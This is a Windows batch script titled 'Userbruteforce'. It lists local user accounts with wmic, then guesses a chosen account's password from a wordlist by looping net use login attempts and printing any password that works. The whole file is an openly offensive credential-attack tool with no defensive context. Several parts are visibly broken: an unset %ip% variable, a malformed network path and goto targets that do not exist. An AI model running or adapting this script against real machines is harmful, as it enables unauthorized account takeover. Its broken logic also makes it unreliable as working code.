@echo off
title Userbruteforce
setlocal enabledelayedexpansion
chcp 65001 >nul
cls
set error=-
color F
set user=""
set wordlist=""
echo cool banner for this too haha
Echo  █    ██   ██████ ▓█████  ██▀███   ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████   █████▒▒█████   ██▀███   ▄████▄  ▓█████ 
Echo ██  ▓██▒▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
Echo ▓██  ▒██░░ ▓██▄   ▒███   ▓██ ░▄█ ▒▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▒████ ░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███   
Echo ▓▓█  ░██░  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
Echo ▒▒█████▓ ▒██████▒▒░▒████▒░██▓ ▒██▒░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒░▒█░   ░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
Echo ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░ ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
Echo ░░▒░ ░ ░ ░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░ ░       ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░
Echo ░░░ ░ ░ ░  ░  ░     ░     ░░   ░  ░    ░   ░░   ░  ░░░ ░ ░   ░         ░    ░ ░   ░ ░ ░ ▒    ░░   ░ ░           ░   
Echo   ░           ░     ░  ░   ░      ░         ░        ░                 ░  ░           ░ ░     ░     ░ ░         ░  ░
echo                                       ░                                                            ░               
echo [90;1m#═╦═══════»[0m  [92m[UserList][0m [95m[1][0m
ping localhost -n 1 >nul
echo [90;1m╚═╦══════»[0m  [92m[UserBruteForce][0m  [95m[2][0m
ping localhost -n 1 >nul
echo [90;1m╚═╦═════»[0m  [92m[exit...][0m   [95m[3][0m
echo.   
   
:input
set /p "=>> " <nul
choice /c 123 >nul

if /I "%errorlevel%" EQU "1" (
  echo.
  echo.
  wmic useraccount where "localaccount='true'" get name,sid,status
  goto input
)

if /I "%errorlevel%" EQU "2" (
  goto userbruteforcey
)

if /I "%errorlevel%" EQU "3" (
  exit
)

:userbruteforcey
set /a count=1
echo.
echo.
echo [TARGET USER]
set /p user=">> "
echo.
echo [PASSWORD LIST]
set /p wordlist=">> "
if not exist "%wordlist%" echo. && echo [91m[%error%][0m [97mFile not found[0m && pause >nul && goto start
net user %user% >nul 2>&1
if /I "%errorlevel%" NEQ "0" (
  echo.
  echo [91m[%error%][0m [97mUser doesn't exist[0m
  pause >nul
  goto userbruteforce
)
net use \\127.0.0.1 /d /y >nul 2>&1
echo.
for /f "tokens=*" %%a in (%wordlist%) do (
  set pass=%%a
  call :varset
)
echo.
echo [91m[%error%][0m [97mPassword not found[0m
pause >nul
goto UserBruteForce

:successUBF
echo.
echo [92m[+][0m [97mPassword found: %pass%[0m
net use \\%ip% /d /y >nul 2>&1
set user=
set pass=
echo.
pause >nul
goto UserBruteForce

:varset
net use \%ip% /user:%user% %pass% 2>&1 | find "System error 1331" >nul
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if /I "%errorlevel%" EQU "0" goto successUBF
net use | find "\\%ip%" >nul
if /I "%errorlevel%" EQU "0" goto successUBF
